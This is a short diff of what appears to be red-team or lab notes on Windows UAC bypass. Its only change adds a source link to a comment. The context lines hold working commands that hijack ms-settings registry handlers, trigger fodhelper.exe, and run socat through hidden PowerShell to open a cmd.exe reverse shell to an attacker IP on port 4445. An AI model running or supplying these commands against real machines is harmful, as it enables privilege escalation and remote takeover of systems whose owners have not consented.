@@ -635,7 +635,7 @@ reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
 reg delete HKCU\Software\Classes\ms-settings\ /f
 
 
-# different registry keys 
+# different registry keys (src: https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses) but this is the cmd version
 set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
 reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
 reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
